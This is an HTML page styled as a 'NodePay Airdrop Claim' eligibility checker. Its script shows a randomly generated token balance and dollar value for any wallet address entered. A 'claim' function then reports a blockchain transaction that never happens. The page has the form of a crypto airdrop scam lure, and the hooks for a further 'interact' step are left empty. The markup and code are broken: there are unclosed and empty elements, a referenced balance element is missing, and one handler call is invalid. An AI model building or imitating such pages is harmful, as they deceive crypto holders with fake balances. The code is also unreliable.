    <meta charset="UTF-8">

    <title>NodePay Airdrop Claim</title>
    <style>
        :root {
            --primary: #25CE85;
            --secondary: #1A8A5E;
            --dark: #0F172A;
            --light: #F8FAFC;
        }

        body {
            background: var(--dark);
            color: var(--light);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            text-align: center;
            padding: 2rem;
            max-width: 600px;
            width: 100%;
        }

        .wallet-section {
            background: rgba(255,255,255,0.05);
            padding: 2rem;
            border-radius: 1rem;
            margin: 2rem 0;
        }

        .wallet-input {
            width: 100%;
            padding: 1rem;
            border: 2px solid var(--primary);
            border-radius: 0.5rem;
            background: transparent;
            color: var(--light);
            font-size: 1rem;
            margin-bottom: 1rem;
        }

        .claim-button {
            background: var(--primary);
            color: var(--dark);
            padding: 1rem 2rem;
            border: none;
            border-radius: 0.5rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            display: none;
            justify-content: center;
            align-items: center;
        }

        .overlay-content {
            background: var(--dark);
            padding: 2rem;
            border-radius: 1rem;
            text-align: center;
            width: 90%;
            max-width: 400px;
            border: 2px solid var(--primary);
        }

        .status-item {
            margin: 1.5rem 0;
            font-size: 1.1rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="wallet-section">
            <h2>Check NODE Eligibility</h2>
            <input 
                type="text" 
                class="wallet-input" 
                placeholder="Enter wallet address (0x...)"
                id="walletAddress"
            >
            <button class="claim-button" onclick="showOverlay()">
                Check Eligibility
            </button>
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="overlay-content">
            <h2>Wallet Status</h2>
            
            <div class="status-item">

            <div class="status-item">

            </div>
            
            <div class="status-item">
                ðŸ‘‰ Worth: $<span id="dollarValue">0</span>
            </div>
            
            <div class="status-item">

            <div style="margin-top: 2rem;">
                <button class="claim-button interact-button" onclick="interact-button()">

                </button>
            </div>
        </div>
    </div>

    <script>
        function generateRandomBalance() {
            // Random NODE between 1000-10000
            const node = Math.floor(Math.random() * 9000) + 1000;
            // Random price between $0.05-$0.15
            const price = (Math.random() * 0.1 + 0.05).toFixed(2);
            return { node, usd: (node * price).toFixed(2) };
        }

        function showOverlay() {
            const address = document.getElementById('walletAddress').value;
            if(address) {
                const balance = generateRandomBalance();
                document.getElementById('nodeBalance').textContent = balance.node;
                document.getElementById('dollarValue').textContent = balance.usd;
                document.getElementById('overlay').style.display = 'flex';
            }
        }

        function closeOverlay() {
            document.getElementById('overlay').style.display = 'none';
        }

        function claimTokens() {
            alert('Claim transaction submitted to blockchain!');
            closeOverlay();
        }
    </script>
